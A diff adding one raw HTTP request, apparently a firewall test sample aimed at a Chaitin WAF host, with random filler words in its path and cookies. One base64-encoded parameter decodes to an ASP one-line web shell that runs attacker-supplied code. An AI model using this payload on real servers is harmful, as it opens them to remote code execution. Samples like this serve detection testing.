@@ -1,0 +1,13 @@
+PUT /offer/imperative/constraint/rectify?manage=pattern&ratify=agile&catastrophic%20failover=section&roll%20out=PCVldmFsIHJlcXVlc3QoInNiIiklPg%3D%3D HTTP/1.1
+Host: waf-ce.chaitin.cn
+Cache-Control: no-cache
+Pragma: no-cache
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12H321 Safari/600.1.4
+Cookie: default=faceted%20search; tentative=command; SESSIONID=342566df9140d52ba200c7a0966dcc623489440b5af338a761d6d03d02f1ff23199843c84ad0cd75891929e9ce51c2b3
+
